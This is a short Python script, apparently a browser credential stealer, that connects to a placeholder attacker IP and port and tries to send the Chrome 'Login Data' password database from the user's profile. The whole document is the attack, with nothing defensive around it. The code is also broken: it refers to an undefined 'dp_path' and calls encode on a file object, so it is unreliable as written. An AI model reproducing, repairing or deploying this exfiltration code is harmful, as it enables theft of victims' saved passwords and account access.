import socket
import os
IP_ADDR = "YOUR IP HERE"
PORT = YOUR PORT HERE
s = socket.socket()
s.connect((IP_ADDR, PORT))
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
filename = "ChromePasswords.db"
file = open(dp_path)
s.send(file.encode("utf-8"))


    
